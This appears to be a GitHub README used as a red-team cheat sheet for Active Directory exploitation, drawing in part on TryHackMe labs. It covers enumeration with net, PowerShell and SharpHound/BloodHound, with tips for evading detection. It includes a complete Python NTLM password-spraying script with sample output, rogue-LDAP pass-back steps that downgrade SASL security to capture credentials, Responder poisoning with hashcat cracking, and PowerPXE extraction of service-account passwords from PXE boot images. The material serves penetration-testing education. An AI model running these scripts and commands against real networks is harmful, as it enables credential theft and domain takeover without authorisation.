# AD-exploitation

## Table of contents

##### ➤ Enumerating Active Directory

Manual enumeration

* [1. Active Directory enumeration through Microsoft Management Console (MMC)](#active-directory-enumeration-through-microsoft-management-console-mmc)
* [2. Active Directory enumeration through Command Prompt](#active-directory-enumeration-through-command-prompt)
* [3. Active Directory enumeration through Powershell](#active-directory-enumeration-through-powershell)
* [4. Active Directory enumeration through Windows management instrumentation (WMI)](#active-directory-enumeration-through-windows-management-instrumentation-wmi)

Automated enumeration

* [1. Active Directory enumeration through Bloodhound](#active-directory-enumeration-through-bloodhound)
* [2. Active Directory enumeration through ADExplorer](#active-directory-enumeration-through-adexplorer)
* [3. Active Directory enumeration through ADRecon](#active-directory-enumeration-through-adrecon)
* [4. Active Directory enumeration through Powerview (Powersploit)](#[active-directory-enumeration-through-adrecon](#active-directory-enumeration-through-powerview-powersploit))


Password enumeration

* [1. NTLM Authenticated Services](#NTLM-Authenticated-Services)
* [2. LDAP Pass-back attacks](#LDAP-Pass-back-attacks)
* [3.Responder - Intercept NetNTLM challenge](#responder---intercept-netntlm-challenge)
* [3.1 Responder - MITM SMB relaying](#responder---nitm-smb-relaying)
* [4. MDT and SCCM - Password scraping attack](#mtd-and-sccm---password-scraping-attack)


``` ```
``` ```
## Active Directory enumeration through Microsoft Management Console (MMC)

##### ➤ Requirements
- RDP or GUI access
- RSAT feature activated or can be activated

##### ➤ Limits
- The GUI requires RDP access to the machine where it is executed.
- Although searching for an object is fast, gathering AD wide properties or attributes cannot be performed. 

##### ➤ Detect if MMC is installed/activated

```
1. Right click on Windows
2. Click on 'run'
3. Write 'MMC' and execute 
```

##### ➤ Install MMC

If the Microsoft Management Console is not directly installed, you can perform the following steps to install RSAT (Remote Server Administration Tools) which include MMC.

```
1. Press Right on Windows
2. Search 'Apps and Features'
3. Click 'Manage Optional Features'
4. Click 'Add a feature'
5. Search for 'RSAT'
6. Select 'RSAT: Active Directory Domain Services and Lightweight Directory Tools' and click Install
```

You can now execute MMC, then we can now attach the AD RSAT Snap-In:
```
1. Click File -> Add/Remove Snap-in
2. Select and Add all three Active Directory Snap-ins
3. Click through any errors and warnings
4. Right-click on Active Directory Domains and Trusts and select Change Forest
Enter <YOUR_DOMAIN> as the Root domain and Click OK
5. Right-click on Active Directory Sites and Services and select Change Forest
Enter <YOUR_DOMAIN> as the Root domain and Click OK
6. Right-click on Active Directory Users and Computers and select Change Domain
Enter <YOUR_DOMAIN> as the Domain and Click OK
7. Right-click on Active Directory Users and Computers in the left-hand pane
8. Click on View -> Advanced Features
```

![image](https://github.com/Kiosec/AD-exploitation/assets/100965892/b503e429-8772-4e51-a001-a1ca97e4311e)


##### ➤ Execute MMC

```
1. Right click on Windows
2. Click on 'run'
3. Write 'MMC' and execute 
```

***Run MMC with a specific user (RUNAS):*** This is where the Runas window  comes into play. In that window, we can start MMC, which will ensure that all MMC network connections will use our injected AD credentials.


``` ```
``` ```
## Active Directory enumeration through Command Prompt

##### ➤ Advantages and Limits
```
Advantages :
- No tools are required
- No GUI is required
- VBScript and other macro languages that are often used for phishing payloads support these commands natively so they can be used to enumerate initial information regarding the AD domain before more specific payloads are crafted.

Limits :
- The net commands must be executed from a domain-joined machine. However, it will the WORKGROUP default domain.
- The net commads may not show all information (e.g., if a user is a member of more than 10 groups).
```

##### ➤ List all users in the AD domain
```
C:\>net user /domain
```

##### ➤ Enumerate more detailed information about a single user account
```
C:\>net user <username> /domain
```

##### ➤ List all groups of the domain
```
C:\>net group /domain
```

##### ➤ Enumerate more detailed information about a group
```
C:\>net group "<group_name>" /domain
```

##### ➤ Enumerate the password policy of the domain
```
C:\>net accounts /domain
```

## Active Directory enumeration through Powershell

##### ➤ Advantages and limits
```
Advantages :
- The PowerShell cmdlets can enumerate significantly more information than the Net commands
- We can specify the server and domain to execute these commands using RUNAS from a non-domain-joined machine.
- We can create our own cmdlets to enumerate specific information.
- We can use the AD-RSAT cmdlets to directly change AD objects, such as resetting passwords or adding a user to a specific group.

Limits:
- PowerShell is often monitored more by the blue teams than Command Prompt.
- We have to install the AD-RSAT tooling or use other, potentially detectable, scripts for PowerShell enumeration.
```

##### ➤ Enumerate a specific AD users

- -Identity : The account name that we are enumerating
- -Properties : Which properties associated with the account will be shown, * will show all properties
- -Server : Since we are not domain-joined, we have to use this parameter to point it to our domain controller

```
# Get-ADUser -Identity <username> -Server <AD_name> -Properties *
PS C:\Get-ADUser -Identity kiosec -Server my.domain.com -Properties *
AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
[...]
Deleted                              :
Department                           : Consulting
Description                          :
DisplayName                          : Kiosec
DistinguishedName                    : CN=Kiosec,OU=Consulting,OU=People,DC=my,DC=domain,DC=com
[...]
```

##### ➤ Enumerate and filter

- -Filter : parameter that allows more control over enumeration and use the 
- Format-Table : cmdlet to display the results such as the following neatly

```
# Display the Name and SamAccountName of user finishing by admin
PS C:\> Get-ADUser -Filter 'Name -like "*admin"' -Server my.domain.com | Format-Table Name,SamAccountName -A
Name             SamAccountName
----             --------------
kiosec.admin     kiosec.admin
user1.admin      user1.admin
another.admin    another.admin
[...]
```

##### ➤ Enumerate a specific AD groups

```
#Enumerate the AD group Administrators
PS C:\> Get-ADGroup -Identity Administrators -Server my.domain.com -properties *
DistinguishedName : CN=Administrators,CN=Builtin,DC=my,DC=domain,DC=com
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Administrators
ObjectClass       : group
ObjectGUID        : f4d1cbcd-4a6f-4531-8550-0394c3273c4f
SamAccountName    : Administrators
SID               : S-1-5-32-544
[...]
```

##### ➤ Enumerate group membership of an AD group

```
PS C:\> Get-ADGroupMember -Identity Administrators -Server my.domain.com

distinguishedName : CN=Domain Admins,CN=Users,DC=my,DC=domain,DC=com

name              : Domain Admins
objectClass       : group
objectGUID        : 8a6186e5-e20f-4f13-b1b0-067f3326f67c
SamAccountName    : Domain Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-512

distinguishedName : CN=Kiosec.admin,CN=Users,DC=my,DC=domain,DC=com name              : Kiosec.admin
objectClass       : user
objectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30fSamAccountName    : Kiosec.admin
SID               : S-1-5-21-3330634377-1326264276-632209373-500

distinguishedName : CN=Administrator,CN=Users,DC=my,DC=domain,DC=com name              : Administrator
objectClass       : user
objectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30fSamAccountName    : Administrator
SID               : S-1-5-21-3330634377-1326264276-632209373-500
[...]
````

##### ➤ Retrieve information about a specific domain
```
PS C:\> Get-ADDomain -Server za.tryhackme.com

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=my,DC=domain,DC=com
DeletedObjectsContainer            : CN=Deleted Objects,DC=my,DC=domain,DC=com
DistinguishedName                  : DC=my,DC=domain,DC=com
DNSRoot                            : my.domain.com
DomainControllersContainer         : OU=Domain Controllers,DC=my,DC=domain,DC=com
[...]
UsersContainer                     : CN=Users,DC=my,DC=domain,DC=com
```

##### ➤ Retrieve information using AD Objects

A more generic search for any AD objects can be performed using the Get-ADObject cmdlet. For example:

Looking for all AD objects that were changed after a specific date

```
PS C:\> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
PS C:\> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server my.domain.com

Deleted           :
DistinguishedName : DC=my,DC=domain,DC=com
Name              : my
ObjectClass       : domainDNS
ObjectGUID        : 518ee1e7-f427-4e91-a081-bb75e655ce7a

Deleted           :
DistinguishedName : CN=Administrator,CN=Users,DC=my,DC=domain,DC=com
Name              : Administrator
ObjectClass       : user
ObjectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30f
```

Perform a password spraying attack without locking out accounts, we can use this to enumerate accounts that have a badPwdCount that is greater than 0, to avoid these accounts in our attack

```
PS C:\> Get-ADObject -Filter 'badPwdCount -gt 0' -Server my.domain.com
PS C:\>
# This only show results if one of the users in the network mistyped their password a couple of times.
```

##### ➤ Altering an AD Objects

Example : force changing the password of our AD user by using the Set-ADAccountPassword cmdlet

```
PS C:\> Set-ADAccountPassword -Identity Kiosec.admin -Server my.admin.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```


``` ```
``` ```
## Active Directory enumeration through Windows management instrumentation (WMI)

https://0xinfection.github.io/posts/wmi-ad-enum/

``` ```
``` ```
## Active Directory enumeration through Bloodhound

##### ➤ Advantages and limits
```
Advantages :
 - GUI for AD enumeration
 - Show attack paths
 - Automated queries
Limits :
 - Sharphound is noisy and cab be detected by AV and EDR.
```

##### ➤ Collect data

There are three different Sharphound collectors:

- Sharphound.ps1 : PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script version. This version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans.
- Sharphound.exe : A Windows executable version for running Sharphound.
- AzureHound.ps1 : PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and Access Management.

***Important note :*** Your Bloodhound and Sharphound versions must match for the best results. Usually there are updates made to Bloodhound which means old Sharphound results cannot be ingested.

##### ➤ Execute Sharphound

***Important note :*** When using these collector scripts on an assessment, there is a high likelihood that these files will be detected as malware and raise an alert to the blue team. This is again where our Windows machine that is non-domain-joined can assist. We can use the runas command to inject the AD credentials and point Sharphound to a Domain Controller. Since we control this Windows machine, we can either disable the AV or create exceptions for specific files or folders.

```
# CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
# Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
# ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.

Sharphound.exe --CollectionMethods <Methods> --Domain my.domain.com --ExcludeDCs
```

The detailled optin can be found here : https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

A good approach is to execute Sharphound with the "All" collection method at the start of your assessment and then execute Sharphound at least twice a day using the "Session" collection method. This will provide a new session data and ensure that these runs are faster since they do not enumerate the entire AD structure again. The best time to execute these session runs is at around 10:00, when users have their first coffee and start to work and again around 14:00, when they get back from their lunch breaks but before they go home. it is possible to clear stagnant session data in Bloodhound on the Database Info tab by clicking the "Clear Session Information" before importing the data from these new Sharphound runs.

##### ➤ Bloodhound

Each of the categories provides the following information:

```
- Overview : Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.
- Node Properties : Shows information regarding the AD account, such as the display name and the title.
- Extra Properties : Provides more detailed AD information such as the distinguished name and when the account was created.
- Group Membership : Shows information regarding the groups that the account is a member of.
- Local Admin Rights : Provides information on domain-joined hosts where the account has administrative privileges.
- Execution Rights : Provides information on special privileges such as the ability to RDP into a machine.
- Outbound Control Rights : Shows information regarding AD objects where this account has permissions to modify their attributes.
- Inbound Control Rights : Provides information regarding AD objects that can modify the attributes of this account.
```

The pre-built analytics queries are queries that the creators of Bloodhound have written themselves to enumerate helpful information.

![image](https://github.com/Kiosec/AD-exploitation/assets/100965892/2d0118ea-6212-436c-a100-aaa98a37ad59)

the most basic attack path using only the default and some special edges. Run a search in Bloodhound to enumerate the attack path. Press the path icon to allow for path searching. The start Node would be our AD username, and the End Node will be the Tier 1 Admins group or Domain Admins group.

![image](https://github.com/Kiosec/AD-exploitation/assets/100965892/7142769f-5129-45e0-9cef-22df68c947f9)


``` ```
``` ```
## Active Directory enumeration through ADExplorer


``` ```
``` ```
## Active Directory enumeration through ADRecon


``` ```
``` ```
## Active Directory enumeration through LDAP enumeration

https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

``` ```
``` ```
## Active Directory enumeration through Powerview (Powersploit)

https://github.com/PowerShellMafia/PowerSploit

``` ```
``` ```
## Enumerating Active Directory
/netonly - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.
/user - Here, we provide the details of the domain and the username. It is always a safe bet to use the Fully Qualified Domain Name (FQDN) instead of just the NetBIOS name of the domain since this will help with resolution.
cmd.exe - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.

```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```


## Test is credential is valid 
```
C:\Tools>dir \\my.domain.com\SYSVOL\
 Volume in drive \\my.domain.com\SYSVOL is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\my.domain.com\SYSVOL

02/24/2022  09:57 PM    <DIR>          .
02/24/2022  09:57 PM    <DIR>          ..
02/24/2022  09:57 PM    <JUNCTION>     my.domain.com [C:\Windows\SYSVOL\domain]
               0 File(s)              0 bytes
               3 Dir(s)  51,835,408,384 bytes free
```


Is there a difference between dir \\my.domain.com\SYSVOL and dir \\<DC IP>\SYSVOL and why the big fuss about DNS?

There is quite a difference, and it boils down to the authentication method being used. When we provide the hostname, network authentication will attempt first to perform Kerberos authentication. Since Kerberos authentication uses hostnames embedded in the tickets, if we provide the IP instead, we can force the authentication type to be NTLM. While on the surface, this does not matter to us right now, it is good to understand these slight differences since they can allow you to remain more stealthy during a Red team assessment. In some instances, organisations will be monitoring for OverPass- and Pass-The-Hash Attacks. Forcing NTLM authentication is a good trick to have in the book to avoid detection in these cases.



``` ```
``` ```
## NTLM Authenticated Services

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is heavily used by the services on a network. However, services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:
- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.

NetNTLM, also often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.

![image](https://github.com/Kiosec/AD-Exploitation/assets/100965892/7b8cf4ca-5923-4bb0-9dfd-704ae086a850)

***Credit :*** Image providing from tryhackme.com

#### Password spraying attack

Example of custom-developed script to stage a password spraying against the web application hosted at this URL: http://ntlmauth.my.domain.com. Navigating to the URL, we can see that it prompts us for Windows Authentication credentials

![image](https://github.com/Kiosec/AD-Exploitation/assets/100965892/3f408cdf-afcd-4810-b786-510014ed25cd)


##### ➤ Script :
```
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

##### ➤ Usage :
```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
We provide the following values for each of the parameters:

<userfile> - Textfile containing our usernames - "usernames.txt"
<fqdn> - Fully qualified domain name associated with the organisation that we are attacking - "my.domain.com"
<password> - The password we want to use for our spraying attack - "Changeme2023"
<attackurl> - The URL of the application that supports Windows Authentication - "http://ntlmauth.my.domain.com"

Example :
[thm@thm]$ python ntlm_passwordspray.py -u usernames.txt -f my.domain.com -p Changeme2023 -a http://ntlmauth.my.domain.com/
[*] Starting passwords spray attack using the following password: Changeme2023
[-] Failed login with Username: john.doe
[-] Failed login with Username: jane.doe
[...]
[+] Valid credential pair found! Username: kiosec Password: Changeme2023
[...]
```


``` ```
``` ```
## LDAP Pass-back attacks

A common attack against network devices, such as printers, when you have gained initial access to the internal network.

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

![image](https://github.com/Kiosec/AD-Exploitation/assets/100965892/d91da52b-dce9-4340-893f-8a7ec11cec72)

***Credit :*** Image providing from tryhackme.com

#### Walkthrough

https://www.youtube.com/watch?v=9GNQiv7vPVc


#### Attack steps - Hosting a vulnerable Rogue LDAP server

##### ➤ 1. Install OpenLDAP
```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

##### ➤ 2. Reconfigure the LDAP server
```
sudo dpkg-reconfigure -p low slapd

- Omit OpenLDAP server configuration? No  
- DNS domain name : <the DC domain name ex : abc.mydomain.com>
- Organization name : idem
- Administrator password : <random_password>
- Database backend to use : MDB
- Do you want the database to be remove when slapd is purged ? : No
- Move olf database ? : Yes
```

##### ➤ 3. Create the vulnerable supported authentication mechanisms (downgrading level of security)
Create a olcSaslSecProps.ldif file with the following properties
- olcSaslSecProps: Specifies the SASL security properties
- noanonymous: Disables mechanisms that support anonymous login
- minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

##### ➤ 4. Patch the LDAP server with the vulnerable ldif file
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

##### ➤ 5. check the new sepported authentication mechanisms
```
Kiosec$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

##### ➤ 6. Capturing the ldap credentials through tcpdump
```
#sudo tcpdump -SX -i <interface> tcp port 389
sudo tcpdump -SX -i tun0 tcp port 389
```

##### ➤ 7. Change the IP in the LDAP configuration of the printer with your IP and test

![image](https://github.com/Kiosec/AD-Exploitation/assets/100965892/a507406f-1592-4817-9d1a-30bf563b8385)



``` ```
``` ```
## Responder - Intercept NetNTLM challenge

Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. 
Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.
By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

#### Intercept the challenge
```
#sudo responder -I <interface>
sudo responder -I tun0
```

#### Crack the challenge
```
hashcat -m 5600 <hash file> <password file> --force
```


``` ```
``` ```
## Responder - MITM SMB relaying

![image](https://github.com/Kiosec/AD-Exploitation/assets/100965892/f0b37093-5641-47d9-acfc-1d3a61130ac9)

***Credit :*** Image providing from tryhackme.com



``` ```
``` ```
## MTD and SCCM - Password scraping attack

One of the configuration of MDT is called Preboot Execution Environment (PXE) boot.

PXE boot allows new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. Once the process is performed, the client will use a TFTP connection to download the PXE boot image. 

The communication flow is shown in the diagram below:

![image](https://github.com/Kiosec/AD-Exploitation/assets/100965892/c1c2ccf5-9927-4790-96b8-376161b29f9c)

***Credit :*** Image providing from tryhackme.com

Additonal information and example : https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/

#### Steps to perform password scraping attacks to recover AD credentials used during the install ***(From a domain machine)***

##### ➤ 0. Information already provided

The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server (ex: 10.0.0.1)

The second piece of information you would have received was the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture. To retrieve this information, you will need to connect to the pxeboot website like **http://pxeboot.mydomain.com**. It will list various BCD files:

```
 9/23/2023  7:58 AM         8192 arm64{A54C6104-7E01-4CFF-8E7B-9C86F0FD6481}.bcd
 9/23/2023  2:55 PM         8192 arm64{B5BE7DBE-947D-4147-BAE5-FA41E9736828}.bcd
 9/23/2023  2:55 PM         8192 arm{862F29EC-CC15-4905-A2D1-76645E0F6393}.bcd
 9/23/2023  7:58 AM         8192 arm{C1DD311A-0F09-433A-8508-1649FAC7A65E}.bcd
  3/4/2022  9:41 PM          213 web.config
 9/23/2023  2:55 PM        12288 x64uefi{359A87E4-E531-4AD6-9883-215C58E77DB9}.bcd
 9/23/2023  7:58 AM        12288 x64uefi{3BF7D336-776E-449B-A403-71FC653BC9E4}.bcd
 9/23/2023  2:55 PM        12288 x64{D1CA8A85-6864-44ED-93D4-0F8860F41ED6}.bcd
 9/23/2023  7:58 AM        12288 x64{F33C24B0-AFDB-4E20-ACE5-47F01A798C50}.bcd
 9/23/2023  7:58 AM         8192 x86uefi{1EC156D8-1075-4A26-9099-8AE917F9A134}.bcd
 9/23/2023  2:55 PM         8192 x86uefi{FC5B3A5E-9F5E-4BF2-8B39-F48E5B97101E}.bcd
 9/23/2023  2:55 PM        12288 x86x64{08310DB9-BC3A-4EAF-AB5D-613D458B29F5}.bcd  <====
 9/23/2023  7:58 AM        12288 x86x64{910F5A1C-1746-4366-9DE2-AB2CCF718F2D}.bcd
 9/23/2023  2:55 PM         8192 x86{809F72FE-2C07-412D-8C98-BE87B6BB06EA}.bcd
 9/23/2023  7:58 AM         8192 x86{DA8C1C4F-950E-4F9A-8923-6CC826785708}.bcd
```

***Note :*** Normally, the files are regenerated by MDT every day.


##### ➤ 1. Enumerate and Retrieve PXE Boot image (PowerPXE tool)

With this initial information now recovered from DHCP, we can enumerate and retrieve the PXE Boot image.

```
#Move to the powerpxe folder
C:\Users\Kiosec\Documents> cd powerpxe


# Download the BCD file from the MDT server
# tftp -i <MDT_SERVER_IP> GET "<BCD_FILE>" conf.bcd
C:\Users\Kiosec\Documents\pxefolder>tftp -i 10.0.0.1 GET "\Tmp\x86x64{08310DB9-BC3A-4EAF-AB5D-613D458B29F5}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s


#Execute powershell and load the script
C:\Users\Kiosec\Documents\pxefolder>powershell -ep bypass
PS C:\Users\Kiosec\Documents\pxefolder> Import-Module .\PowerPXE.ps1


#Use powerpxe to read the BCD file contents and recover the locations of the PXE Boot images
PS C:\Users\Kiosec\Documents\pxefolder> $BCDFile = "conf.bcd"
PS C:\Users\Kiosec\Documents\pxefolder> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim


# Now that we have the location of the PXE Boot image, we can again use TFTP to download this image
PS C:\Users\Kiosec\Documents\pxefolder> tftp -i 10.0.0.1 GET "\Boot\x64\Images\Li
teTouchPE_x64.wim" pxeboot.wim
Transfer successful: 341899611 bytes in 130 second(s), 2629997 bytes/s


# Recovering the credentials from the PXE Boot Image (.wim)
PS C:\Users\Kiosec\Documents\pxefolder> Get-FindCredentials -WimFile pxeboot.wim      
>> Open pxeboot.wim 
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\MMDTServer\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = MYDOMAIN
>>>> >>>> UserPassword = mysecurepassword01!
```
